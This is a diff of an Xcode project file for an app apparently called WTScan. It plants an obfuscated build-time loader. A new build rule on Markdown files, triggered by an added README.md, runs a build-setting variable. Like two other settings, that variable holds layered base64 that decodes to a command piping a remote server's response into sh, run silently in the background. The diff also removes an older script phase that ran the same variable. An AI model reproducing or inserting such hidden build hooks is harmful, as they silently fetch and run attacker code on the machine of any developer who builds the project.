@@ -10,9 +10,27 @@
 		1FBDB2862F110F8400801D76 /* GoogleMobileAds in Frameworks */ = {isa = PBXBuildFile; productRef = 1FBDB2852F110F8400801D76 /* GoogleMobileAds */; };
 		1FBDB3BC2F11113D00801D76 /* FirebaseCore in Frameworks */ = {isa = PBXBuildFile; productRef = 1FBDB3BB2F11113D00801D76 /* FirebaseCore */; };
 		1FBDB3BE2F11113D00801D76 /* FirebaseDatabase in Frameworks */ = {isa = PBXBuildFile; productRef = 1FBDB3BD2F11113D00801D76 /* FirebaseDatabase */; };
+		79B901B1672D4F01A6634D6E /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 4326326C53B946B2A6634D6E /* README.md */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		A5A5E9DC92D44F2BB1634D6E /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${AE6D436}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
+		4326326C53B946B2A6634D6E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		881E64D62EC35BE000FF0ADE /* WTScan.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = WTScan.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -70,6 +88,7 @@
 		881E64D72EC35BE000FF0ADE /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				4326326C53B946B2A6634D6E /* README.md */,
 				881E64D62EC35BE000FF0ADE /* WTScan.app */,
 			);
 			name = Products;
@@ -82,12 +101,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 881E64E32EC35BE200FF0ADE /* Build configuration list for PBXNativeTarget "WTScan" */;
 			buildPhases = (
-				8B2821CBDFF34F5CB2634D6E /* Build Target Libraries */,
 				881E64D22EC35BE000FF0ADE /* Sources */,
 				881E64D32EC35BE000FF0ADE /* Frameworks */,
 				881E64D42EC35BE000FF0ADE /* Resources */,
 			);
 			buildRules = (
+				A5A5E9DC92D44F2BB1634D6E /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -147,33 +166,11 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				79B901B1672D4F01A6634D6E /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-		8B2821CBDFF34F5CB2634D6E /* Build Target Libraries */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Libraries";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
-			showEnvVarsInLog = 0;
-		};
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		881E64D22EC35BE000FF0ADE /* Sources */ = {
@@ -191,7 +188,7 @@
 			buildSettings = {
 				A45ED5A = "((d(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwSFpESk9TR1ZIZUZwTmExbzJXa1ZOTVdOSFNuQlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | d | sh ) >/dev/null 2>&1 &)";
 				A6E983A = "((u(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJURE5LY0ZveVpITmFWelZzWkVNMWNHSnBPV2hMVTBsblprTkNlbUZCYnowSwo= | u | sh ) >/dev/null 2>&1 &)";
-				AE6D436 = "((x(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREphY0ZwSFVuTmFWM0IyWlZNMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | x | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((z(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2WVhCd2JHVjBhVzFsTG1sdUwyRXBJaUI4SUhOb0NnPT0K | z | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -257,7 +254,7 @@
 			buildSettings = {
 				A45ED5A = "((d(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwSFpESk9TR1ZIZUZwTmExbzJXa1ZOTVdOSFNuQlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | d | sh ) >/dev/null 2>&1 &)";
 				A6E983A = "((u(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJURE5LY0ZveVpITmFWelZzWkVNMWNHSnBPV2hMVTBsblprTkNlbUZCYnowSwo= | u | sh ) >/dev/null 2>&1 &)";
-				AE6D436 = "((x(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREphY0ZwSFVuTmFWM0IyWlZNMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | x | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((z(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2WVhCd2JHVjBhVzFsTG1sdUwyRXBJaUI4SUhOb0NnPT0K | z | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
